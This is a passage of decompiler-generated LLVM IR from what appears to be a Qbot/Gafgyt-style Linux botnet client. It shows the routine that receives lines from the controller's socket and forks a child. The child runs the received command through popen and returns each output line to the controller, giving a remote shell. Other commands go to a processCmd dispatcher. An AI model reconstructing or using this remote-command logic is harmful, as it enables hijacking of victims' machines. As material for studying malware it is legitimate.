dec_label_pc_804fc93:                             ; preds = %dec_label_pc_804fca0
  %v5_804fc93 = add i32 %storemerge13.in137, 1
  %storemerge13 = inttoptr i32 %v5_804fc93 to i8*
  %v2_804fc99 = load i8, i8* %storemerge13, align 1
  %v3_804fc9c = icmp ult i8 %v2_804fc99, 32
  store i1 %v3_804fc9c, i1* %cf.global-to-local, align 1
  %v7_804fc9c = icmp eq i8 %v2_804fc99, 32
  br i1 %v7_804fc9c, label %dec_label_pc_804fcaa, label %dec_label_pc_804fca0

dec_label_pc_804fca0:                             ; preds = %dec_label_pc_804fc8a, %dec_label_pc_804fc93
  %storemerge13138 = phi i8* [ %storemerge13, %dec_label_pc_804fc93 ], [ %storemerge13127, %dec_label_pc_804fc8a ]
  %storemerge13.in137 = phi i32 [ %v5_804fc93, %dec_label_pc_804fc93 ], [ %v1_804fc8d, %dec_label_pc_804fc8a ]
  %v2_804fca3 = load i8, i8* %storemerge13138, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fca6 = icmp eq i8 %v2_804fca3, 0
  %v1_804fca8 = icmp eq i1 %v4_804fca6, false
  br i1 %v1_804fca8, label %dec_label_pc_804fc93, label %dec_label_pc_804fcaa

dec_label_pc_804fcaa:                             ; preds = %dec_label_pc_804fc93, %dec_label_pc_804fca0, %dec_label_pc_804fc8a
  %storemerge13.lcssa = phi i8* [ %storemerge13127, %dec_label_pc_804fc8a ], [ %storemerge13138, %dec_label_pc_804fca0 ], [ %storemerge13, %dec_label_pc_804fc93 ]
  %v2_804fcad = load i8, i8* %storemerge13.lcssa, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fcb0 = icmp eq i8 %v2_804fcad, 0
  br i1 %v4_804fcb0, label %dec_label_pc_8050021.outer, label %dec_label_pc_804fcb8

dec_label_pc_804fcb8:                             ; preds = %dec_label_pc_804fcaa
  store i8 0, i8* %storemerge13.lcssa, align 1
  %v3_804fcdc = call i32 @_strlen(i8* %storemerge13127)
  %v6_804fce3 = add i32 %v2_8050021, %v3_804fcdc
  %v1_804fce6 = add i32 %v6_804fce3, 2
  %v5_804fce6 = icmp ugt i32 %v6_804fce3, -3
  store i1 %v5_804fce6, i1* %cf.global-to-local, align 1
  %v5_804fce9 = inttoptr i32 %v1_804fce6 to i8*
  br label %dec_label_pc_804fd13

dec_label_pc_804fcee:                             ; preds = %dec_label_pc_804fd3c, %dec_label_pc_804fd13
  %v3_804fd05 = call i32 @_strlen(i8* %v5_804fce9)
  %v4_804fd05 = mul i32 %v3_804fd05, -1
  %v1_804fd0b = sub i32 0, %v4_804fd05
  %v6_804fd0c = sub i32 %v1_804fce6, %v4_804fd05
  %v11_804fd0c = icmp ult i32 %v6_804fd0c, %v1_804fd0b
  store i1 %v11_804fd0c, i1* %cf.global-to-local, align 1
  %v1_804fd0f = add i32 %v6_804fd0c, -1
  %v1_804fd10 = inttoptr i32 %v1_804fd0f to i8*
  store i8 0, i8* %v1_804fd10, align 1
  br label %dec_label_pc_804fd13

dec_label_pc_804fd13:                             ; preds = %dec_label_pc_804fcb8, %dec_label_pc_804fcee
  %v3_804fd2a = call i32 @_strlen(i8* %v5_804fce9)
  %v4_804fd2a = mul i32 %v3_804fd2a, -1
  %v1_804fd30 = sub i32 0, %v4_804fd2a
  %v6_804fd31 = sub i32 %v1_804fce6, %v4_804fd2a
  %v11_804fd31 = icmp ult i32 %v6_804fd31, %v1_804fd30
  store i1 %v11_804fd31, i1* %cf.global-to-local, align 1
  %v1_804fd34 = add i32 %v6_804fd31, -1
  %v1_804fd35 = inttoptr i32 %v1_804fd34 to i8*
  %v2_804fd35 = load i8, i8* %v1_804fd35, align 1
  %v6_804fd38 = icmp ult i8 %v2_804fd35, 10
  store i1 %v6_804fd38, i1* %cf.global-to-local, align 1
  %v10_804fd38 = icmp eq i8 %v2_804fd35, 10
  br i1 %v10_804fd38, label %dec_label_pc_804fcee, label %dec_label_pc_804fd3c

dec_label_pc_804fd3c:                             ; preds = %dec_label_pc_804fd13
  %v3_804fd53 = call i32 @_strlen(i8* %v5_804fce9)
  %v4_804fd53 = mul i32 %v3_804fd53, -1
  %v1_804fd59 = sub i32 0, %v4_804fd53
  %v6_804fd5a = sub i32 %v1_804fce6, %v4_804fd53
  %v11_804fd5a = icmp ult i32 %v6_804fd5a, %v1_804fd59
  store i1 %v11_804fd5a, i1* %cf.global-to-local, align 1
  %v1_804fd5d = add i32 %v6_804fd5a, -1
  %v1_804fd5e = inttoptr i32 %v1_804fd5d to i8*
  %v2_804fd5e = load i8, i8* %v1_804fd5e, align 1
  %v6_804fd61 = icmp ult i8 %v2_804fd5e, 13
  store i1 %v6_804fd61, i1* %cf.global-to-local, align 1
  %v10_804fd61 = icmp eq i8 %v2_804fd5e, 13
  br i1 %v10_804fd61, label %dec_label_pc_804fcee, label %dec_label_pc_804fd65

dec_label_pc_804fd65:                             ; preds = %dec_label_pc_804fd3c
  %v2_804fd73143 = load i8, i8* %v5_804fce9, align 1
  %v3_804fd76146 = icmp ult i8 %v2_804fd73143, 32
  store i1 %v3_804fd76146, i1* %cf.global-to-local, align 1
  %v7_804fd76150 = icmp eq i8 %v2_804fd73143, 32
  br i1 %v7_804fd76150, label %dec_label_pc_804fd84, label %dec_label_pc_804fd7a

dec_label_pc_804fd6d:                             ; preds = %dec_label_pc_804fd7a
  %v5_804fd6d = add i32 %v4_804fd70153, 1
  %v22_804fd6d = inttoptr i32 %v5_804fd6d to i8*
  %v2_804fd73 = load i8, i8* %v22_804fd6d, align 1
  %v3_804fd76 = icmp ult i8 %v2_804fd73, 32
  store i1 %v3_804fd76, i1* %cf.global-to-local, align 1
  %v7_804fd76 = icmp eq i8 %v2_804fd73, 32
  br i1 %v7_804fd76, label %dec_label_pc_804fd84, label %dec_label_pc_804fd7a

dec_label_pc_804fd7a:                             ; preds = %dec_label_pc_804fd65, %dec_label_pc_804fd6d
  %v4_804fd70153 = phi i32 [ %v5_804fd6d, %dec_label_pc_804fd6d ], [ %v1_804fce6, %dec_label_pc_804fd65 ]
  %stack_var_-64.0152 = phi i8* [ %v22_804fd6d, %dec_label_pc_804fd6d ], [ %v5_804fce9, %dec_label_pc_804fd65 ]
  %v2_804fd7d = load i8, i8* %stack_var_-64.0152, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fd80 = icmp eq i8 %v2_804fd7d, 0
  %v1_804fd82 = icmp eq i1 %v4_804fd80, false
  br i1 %v1_804fd82, label %dec_label_pc_804fd6d, label %dec_label_pc_804fd84

dec_label_pc_804fd84:                             ; preds = %dec_label_pc_804fd6d, %dec_label_pc_804fd7a, %dec_label_pc_804fd65
  %stack_var_-64.0.lcssa = phi i8* [ %v5_804fce9, %dec_label_pc_804fd65 ], [ %stack_var_-64.0152, %dec_label_pc_804fd7a ], [ %v22_804fd6d, %dec_label_pc_804fd6d ]
  %v4_804fd70.lcssa = phi i32 [ %v1_804fce6, %dec_label_pc_804fd65 ], [ %v4_804fd70153, %dec_label_pc_804fd7a ], [ %v5_804fd6d, %dec_label_pc_804fd6d ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v5_804fd8a = add i32 %v4_804fd70.lcssa, 1
  %v2_804fdb3159 = load i8, i8* %v5_804fce9, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fdb6161 = icmp eq i8 %v2_804fdb3159, 0
  %v1_804fdb8163 = icmp eq i1 %v4_804fdb6161, false
  br i1 %v1_804fdb8163, label %dec_label_pc_804fd95, label %dec_label_pc_804fdba

dec_label_pc_804fd95:                             ; preds = %dec_label_pc_804fd84, %dec_label_pc_804fd95
  %storemerge12165 = phi i8* [ %storemerge12, %dec_label_pc_804fd95 ], [ %v5_804fce9, %dec_label_pc_804fd84 ]
  %storemerge12.in164 = phi i32 [ %v5_804fdad, %dec_label_pc_804fd95 ], [ %v1_804fce6, %dec_label_pc_804fd84 ]
  %v2_804fd98 = load i8, i8* %storemerge12165, align 1
  %v3_804fd98 = zext i8 %v2_804fd98 to i32
  store i32 %v3_804fd98, i32* %stack_var_-5888, align 4
  %v1_804fda1 = call i32 @__GI_toupper(i32 %v3_804fd98)
  %v1_804fda6 = urem i32 %v1_804fda1, 256
  %v2_804fda6 = load i32, i32* @edx, align 4
  %v3_804fda6 = and i32 %v2_804fda6, -256
  %v4_804fda6 = or i32 %v3_804fda6, %v1_804fda6
  store i32 %v4_804fda6, i32* @edx, align 4
  %v1_804fdab = trunc i32 %v1_804fda1 to i8
  store i8 %v1_804fdab, i8* %storemerge12165, align 1
  %v5_804fdad = add i32 %storemerge12.in164, 1
  %storemerge12 = inttoptr i32 %v5_804fdad to i8*
  %v2_804fdb3 = load i8, i8* %storemerge12, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fdb6 = icmp eq i8 %v2_804fdb3, 0
  %v1_804fdb8 = icmp eq i1 %v4_804fdb6, false
  br i1 %v1_804fdb8, label %dec_label_pc_804fd95, label %dec_label_pc_804fdba

dec_label_pc_804fdba:                             ; preds = %dec_label_pc_804fd95, %dec_label_pc_804fd84
  store i1 false, i1* @df, align 1
  store i32 %v1_804fce6, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805fe63.690 to i32), i32* @edi, align 4
  %v7_804fdea = call i32 @_strncmp(i8* %v5_804fce9, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805fe63.690, i32 0, i32 0), i32 3)
  %v8_804fdea = urem i32 %v7_804fdea, 2
  %v9_804fdea = icmp eq i32 %v8_804fdea, 0
  %v0_804fdec = load i1, i1* %cf.global-to-local, align 1
  %v2_804fdec = or i1 %v0_804fdec, %v9_804fdea
  %v3_804fdec = zext i1 %v2_804fdec to i32
  %v4_804fdec = load i32, i32* @edx, align 4
  %v5_804fdec = and i32 %v4_804fdec, -256
  %v6_804fdec = or i32 %v3_804fdec, %v5_804fdec
  %v7_804fdec = xor i32 %v6_804fdec, 1
  store i32 %v7_804fdec, i32* @edx, align 4
  %v3_804fdf2 = and i32 %v7_804fdea, -256
  %v1_804fdf4 = trunc i32 %v7_804fdec to i8
  %v3_804fdf4 = zext i1 %v0_804fdec to i8
  %v4_804fdf4 = sub nsw i8 %v1_804fdf4, %v3_804fdf4
  %v15_804fdf4 = icmp eq i8 %v4_804fdf4, 0
  %v20_804fdf4 = zext i8 %v4_804fdf4 to i32
  %v23_804fdf4 = or i32 %v20_804fdf4, %v3_804fdf2
  store i32 %v23_804fdf4, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fdfd = icmp eq i1 %v15_804fdf4, false
  br i1 %v1_804fdfd, label %dec_label_pc_804fefe, label %dec_label_pc_804fe03

dec_label_pc_804fe03:                             ; preds = %dec_label_pc_804fdba
  %v0_804fe03 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fe08 = icmp eq i32 %v0_804fe03, 0
  %v1_804fe0a = icmp eq i1 %v1_804fe08, false
  br i1 %v1_804fe0a, label %dec_label_pc_8050021.outer, label %dec_label_pc_804fe10

dec_label_pc_804fe10:                             ; preds = %dec_label_pc_804fe03
  store i32 %v2_804fe10, i32* %stack_var_-5888, align 4
  %v5_804fe2c = call i32 @__GI_memset(i8* %v4_804fe2c, i32 0, i32 1024)
  store i32 %v2_804fe10, i32* %stack_var_-5888, align 4
  %v4_804fe4a = call i32 @szprintf(i32 %v2_804fe10, i32 ptrtoint ([8 x i8]* @global_var_805fe66.691 to i32), i32 %v5_804fd8a)
  store i32 %v2_804fe10, i32* %stack_var_-5888, align 4
  %v4_804fe61 = call i32 @fdpopen(i32 %v2_804fe10, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805fe12.680, i32 0, i32 0))
  store i32 %v2_804fe10, i32* %stack_var_-5888, align 4
  %v4_804fede166 = call i32 @fdgets(i32 %v2_804fe10, i32 1024, i32 %v4_804fe61)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fee3167 = icmp eq i32 %v4_804fede166, 0
  %v1_804fee5169 = icmp eq i1 %v1_804fee3167, false
  br i1 %v1_804fee5169, label %dec_label_pc_804fe6b, label %dec_label_pc_804fee7

dec_label_pc_804fe6b:                             ; preds = %dec_label_pc_804fe10, %dec_label_pc_804fe6b
  store i32 %v2_804fe10, i32* %stack_var_-5888, align 4
  %v2_804fe74 = call i32 @trim(i8* %v4_804fe2c)
  %v0_804fe79 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804fe79, i32* %stack_var_-5888, align 4
  %v3_804fe94 = call i32 @sockprintf(i32 %v0_804fe79, i32 ptrtoint ([3 x i8]* @global_var_805fe6e.692 to i32))
  store i32 %v2_804fe10, i32* %stack_var_-5888, align 4
  %v5_804feb5 = call i32 @__GI_memset(i8* %v4_804fe2c, i32 0, i32 1024)
  store i32 1, i32* %stack_var_-5888, align 4
  %v1_804fec1 = call i32 @sleep(i32 1)
  store i32 %v2_804fe10, i32* %stack_var_-5888, align 4
  %v4_804fede = call i32 @fdgets(i32 %v2_804fe10, i32 1024, i32 %v4_804fe61)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fee3 = icmp eq i32 %v4_804fede, 0
  %v1_804fee5 = icmp eq i1 %v1_804fee3, false
  br i1 %v1_804fee5, label %dec_label_pc_804fe6b, label %dec_label_pc_804fee7

dec_label_pc_804fee7:                             ; preds = %dec_label_pc_804fe6b, %dec_label_pc_804fe10
  store i32 %v4_804fe61, i32* %stack_var_-5888, align 4
  %v1_804feed = call i32 @fdpclose(i32 %v4_804fe61)
  store i32 %v1_804feed, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804fef9 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804fefe

dec_label_pc_804fefe:                             ; preds = %dec_label_pc_804fdba, %dec_label_pc_804fee7
  store i32 %v5_804fd8a, i32* @eax, align 4
  store i32 %v5_804fd8a, i32* %stack_var_-5888, align 4
  %v3_804ff13 = call i32 @__GI_strtok(i32 %v5_804fd8a, i32 ptrtoint (i32* @global_var_805fe71.693 to i32))
  %v5_804ff18 = inttoptr i32 %v3_804ff13 to i8*
  store i8* %v5_804ff18, i8** %stack_var_-36, align 4
  store i32 %v1_804fce6, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804ffcf34 = icmp eq i32 %v3_804ff13, 0
  %v1_804ffd341 = icmp eq i1 %v5_804ffcf34, false
  br i1 %v1_804ffd341, label %dec_label_pc_804ff29, label %dec_label_pc_804ffd9

dec_label_pc_804ff29:                             ; preds = %dec_label_pc_804fefe, %dec_label_pc_804ffb8
  %v3_804ff3a = phi i8* [ %tmp124, %dec_label_pc_804ffb8 ], [ %v5_804ff18, %dec_label_pc_804fefe ]
  %stack_var_-40.142 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804ffb8 ], [ 1, %dec_label_pc_804fefe ]
  %v2_804ff2c = load i8, i8* %v3_804ff3a, align 1
  %v3_804ff2c = zext i8 %v2_804ff2c to i32
  store i32 %v3_804ff2c, i32* @eax, align 4
  %v6_804ff2f = icmp ult i8 %v2_804ff2c, 10
  store i1 %v6_804ff2f, i1* %cf.global-to-local, align 1
  %v10_804ff2f = icmp eq i8 %v2_804ff2c, 10
  br i1 %v10_804ff2f, label %dec_label_pc_804ffb8, label %dec_label_pc_804ff37

dec_label_pc_804ff37:                             ; preds = %dec_label_pc_804ff29
  %v4_804ff29 = ptrtoint i8* %v3_804ff3a to i32
  store i32 %stack_var_-40.142, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ff29, i32* @edi, align 4
  %v3_804ff51 = call i32 @_strlen(i8* %v3_804ff3a)
  %v1_804ff55 = add i32 %v3_804ff51, 1
  store i32 %v1_804ff55, i32* %stack_var_-5888, align 4
  %v1_804ff5c = call i32 @malloc(i32 %v1_804ff55)
  %v1_804ff61 = load i32, i32* @ebp, align 4
  %v2_804ff61 = load i32, i32* @ebx, align 4
  %v3_804ff61 = mul i32 %v2_804ff61, 4
  %v4_804ff61 = add i32 %v1_804ff61, -616
  %v5_804ff61 = add i32 %v4_804ff61, %v3_804ff61
  %v6_804ff61 = inttoptr i32 %v5_804ff61 to i32*
  store i32 %v1_804ff5c, i32* %v6_804ff61, align 4
  %v3_804ff68 = load i8*, i8** %stack_var_-36, align 4
  %v4_804ff68 = ptrtoint i8* %v3_804ff68 to i32
  %v3_804ff7f = call i32 @_strlen(i8* %v3_804ff68)
  %v1_804ff83 = add i32 %v3_804ff7f, 1
  %v0_804ff8c = load i32, i32* @ebp, align 4
  %v2_804ff8c = mul i32 %stack_var_-40.142, 4
  %v3_804ff8c = add i32 %v2_804ff8c, -616
  %v4_804ff8c = add i32 %v0_804ff8c, %v3_804ff8c
  %v5_804ff8c = inttoptr i32 %v4_804ff8c to i32*
  %v6_804ff8c = load i32, i32* %v5_804ff8c, align 4
  %v1_804ff93 = inttoptr i32 %v6_804ff8c to i8*
  store i32 %v6_804ff8c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804ff98 = and i32 %v6_804ff8c, -256
  %v5_804ff9a = call i8* @_memset(i8* %v1_804ff93, i32 %v1_804ff98, i32 %v1_804ff83)
  %v6_804ff9a = ptrtoint i8* %v5_804ff9a to i32
  store i32 %v6_804ff9a, i32* @ecx, align 4
  %v0_804ffa2 = load i32, i32* @ebp, align 4
  %v4_804ffa2 = add i32 %v0_804ffa2, %v3_804ff8c
  %v5_804ffa2 = inttoptr i32 %v4_804ffa2 to i32*
  %v6_804ffa2 = load i32, i32* %v5_804ffa2, align 4
  store i32 %v6_804ffa2, i32* @eax, align 4
  store i32 %v6_804ffa2, i32* %stack_var_-5888, align 4
  %v3_804ffb0 = inttoptr i32 %v6_804ffa2 to i8*
  %v4_804ffb0 = call i32 @strcpy(i8* %v3_804ffb0, i32 %v4_804ff68)
  store i32 %v4_804ffb0, i32* @eax, align 4
  %v4_804ffb5 = add i32 %stack_var_-40.142, 1
  br label %dec_label_pc_804ffb8

dec_label_pc_804ffb8:                             ; preds = %dec_label_pc_804ff29, %dec_label_pc_804ff37
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.142, %dec_label_pc_804ff29 ], [ %v4_804ffb5, %dec_label_pc_804ff37 ]
  store i32 0, i32* %stack_var_-5888, align 4
  %v3_804ffc7 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805fe71.693 to i32))
  store i32 %v3_804ffc7, i32* %tmp122, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804ffcf = icmp eq i32 %v3_804ffc7, 0
  %v1_804ffd3 = icmp eq i1 %v5_804ffcf, false
  %tmp124 = inttoptr i32 %v3_804ffc7 to i8*
  br i1 %v1_804ffd3, label %dec_label_pc_804ff29, label %dec_label_pc_804ffd9

dec_label_pc_804ffd9:                             ; preds = %dec_label_pc_804ffb8, %dec_label_pc_804fefe
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_804fefe ], [ %stack_var_-40.0, %dec_label_pc_804ffb8 ]
  store i32 %stack_var_-40.1.lcssa, i32* %stack_var_-5888, align 4
  %v4_804ffe9 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v9_804ffee = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_804ffee, i1* %cf.global-to-local, align 1
  %v7_804fff2 = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_804fff2, label %dec_label_pc_8050004.lr.ph, label %dec_label_pc_8050021.outer

dec_label_pc_8050004.lr.ph:                       ; preds = %dec_label_pc_804ffd9
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050004

dec_label_pc_8050004:                             ; preds = %dec_label_pc_8050004.lr.ph, %dec_label_pc_8050004
  %storemerge179 = phi i32 [ 1, %dec_label_pc_8050004.lr.ph ], [ %v4_8050016, %dec_label_pc_8050004 ]
  %v0_8050007 = load i32, i32* @ebp, align 4
  %v2_8050007 = mul i32 %storemerge179, 4
  %v3_8050007 = add i32 %v2_8050007, -616
  %v4_8050007 = add i32 %v3_8050007, %v0_8050007
  %v5_8050007 = inttoptr i32 %v4_8050007 to i32*
  %v6_8050007 = load i32, i32* %v5_8050007, align 4
  store i32 %v6_8050007, i32* %stack_var_-5888, align 4
  %v1_8050011 = call i32 @free(i32 %v6_8050007)
  %v4_8050016 = add nuw i32 %storemerge179, 1
  %v10_805001c = icmp ult i32 %v4_8050016, %stack_var_-40.1.lcssa
  store i1 %v10_805001c, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8050016, %stack_var_-40.1.lcssa
  br i1 %exitcond, label %dec_label_pc_8050021.outer, label %dec_label_pc_8050004

dec_label_pc_8050021.outer:                       ; preds = %dec_label_pc_8050004, %dec_label_pc_804fe03, %dec_label_pc_804ffd9, %dec_label_pc_804fcaa, %dec_label_pc_804fc73, %dec_label_pc_804f982
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_804f982 ], [ %stack_var_-96.1, %dec_label_pc_804fc73 ], [ %stack_var_-96.1, %dec_label_pc_804fcaa ], [ %stack_var_-96.1, %dec_label_pc_804ffd9 ], [ %stack_var_-96.1, %dec_label_pc_804fe03 ], [ %stack_var_-96.1, %dec_label_pc_8050004 ]
  br label %dec_label_pc_8050021

dec_label_pc_8050021:                             ; preds = %dec_label_pc_8050021.outer, %dec_label_pc_804fc11
  %v0_8050027 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_8050027, i32* %stack_var_-5888, align 4
  %v5_805003c = call i32 @recvLine(i32 %v0_8050027, i8* %tmp121, i32 4096)
  %v8_8050044 = icmp ne i32 %v5_805003c, -1
  store i1 %v8_8050044, i1* %cf.global-to-local, align 1
  %v13_8050044 = icmp eq i32 %v5_805003c, -1
  %v1_8050048 = icmp eq i1 %v13_8050044, false
  br i1 %v1_8050048, label %dec_label_pc_804fb7c, label %dec_label_pc_804f96b.outer

; uselistorder directives
  uselistorder i32 %v5_805003c, { 0, 2, 1 }
  uselistorder i32 %stack_var_-96.2.ph, { 0, 2, 1 }
  uselistorder i32 %v4_8050016, { 1, 0, 2 }
  uselistorder i32 %storemerge179, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v1_804ff55, { 1, 0 }
  uselistorder i32 %stack_var_-40.142, { 0, 3, 2, 1 }
  uselistorder i8* %v3_804ff3a, { 2, 1, 0 }
  uselistorder i32 %v4_804fe61, { 2, 1, 3, 0 }
  uselistorder i1 %v0_804fdec, { 1, 0 }
  uselistorder i32 %v7_804fdea, { 1, 0 }
  uselistorder i8* %storemerge12, { 1, 0 }
  uselistorder i32 %v5_804fdad, { 1, 0 }
  uselistorder i32 %v1_804fda1, { 1, 0 }
  uselistorder i8* %storemerge12165, { 1, 0 }
  uselistorder i32 %v6_804fd5a, { 1, 0 }
  uselistorder i32 %v6_804fd31, { 1, 0 }
  uselistorder i32 %v6_804fd0c, { 1, 0 }
  uselistorder i8* %v5_804fce9, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804fce6, { 4, 5, 0, 1, 2, 6, 7, 3, 8 }
  uselistorder i32 %v6_804fce3, { 1, 0 }
  uselistorder i8* %storemerge13.lcssa, { 1, 0 }
  uselistorder i32 %v4_804fc4d, { 1, 2, 3, 0 }
  uselistorder i32 %storemerge14, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v0_804fb22, { 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0, 2 }
  uselistorder i32 %v2_804faef, { 1, 0 }
  uselistorder i32 %v1_804fadb, { 1, 0 }
  uselistorder i32 %v2_804fad2, { 1, 0 }
  uselistorder i32 %v0_804faa7, { 1, 0 }
  uselistorder i32 %v0_804fa4c, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 2, 0, 3 }
  uselistorder i8* %storemerge13127, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804fe10, { 5, 4, 2, 3, 0, 1, 7, 6, 9, 8, 10 }
  uselistorder i8* %tmp121, { 2, 0, 1 }
  uselistorder i32 %v2_8050021, { 2, 0, 4, 6, 5, 1, 7, 9, 8, 10, 3 }
  uselistorder i32 %v1_804f8ce, { 1, 0, 2 }
  uselistorder i32 %v3_804f881, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804f826, { 0, 2, 1 }
  uselistorder i32 %v2_804f807, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v7_804f7aa, { 1, 0 }
  uselistorder i32 %v2_804f769, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 7, 6, 5, 1, 0, 3, 2, 4, 8 }
  uselistorder i32* %stack_var_-5888, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 39, 36, 37, 1, 2, 40, 42, 43, 44, 41, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-36, { 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 29, 0, 55, 1, 3, 2, 49, 4, 54, 5, 6, 52, 7, 53, 8, 9, 51, 10, 11, 13, 14, 12, 15, 16, 17, 18, 50, 19, 20, 21, 22, 23, 24, 28, 56, 25, 26, 27, 30, 48, 46, 31, 47, 32, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 7, 0, 6, 1, 5, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 116, 115, 114, 113, 112, 111, 110, 109, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @listFork, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i32)* @sockprintf, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 29, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805fe21.682 to i32), { 0, 2, 1 }
  uselistorder [2 x i8]* @global_var_805fe12.680, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_805fe12.680 to i32), { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 1, 2, 3, 4, 5, 6, 22, 23 }
  uselistorder i32 ptrtoint (i32* @global_var_805fdfe.678 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050021.outer, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050004, { 1, 0 }
  uselistorder label %dec_label_pc_804ffb8, { 1, 0 }
  uselistorder label %dec_label_pc_804ff29, { 1, 0 }
  uselistorder label %dec_label_pc_804fefe, { 1, 0 }
  uselistorder label %dec_label_pc_804fe6b, { 1, 0 }
  uselistorder label %dec_label_pc_804fd95, { 1, 0 }
  uselistorder label %dec_label_pc_804fd84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fd7a, { 1, 0 }
  uselistorder label %dec_label_pc_804fd13, { 1, 0 }
  uselistorder label %dec_label_pc_804fcaa, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fca0, { 1, 0 }
  uselistorder label %dec_label_pc_804fc73, { 1, 0 }
  uselistorder label %dec_label_pc_804fb79, { 1, 0 }
  uselistorder label %dec_label_pc_804fb0e, { 1, 0 }
  uselistorder label %dec_label_pc_804faec, { 1, 0 }
  uselistorder label %dec_label_pc_804fa38, { 1, 0 }
  uselistorder label %dec_label_pc_804fa0e, { 1, 0 }
  uselistorder label %dec_label_pc_804f974, { 1, 0 }
  uselistorder label %dec_label_pc_804f96b.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f944, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f8c9, { 4, 3, 1, 0, 2 }
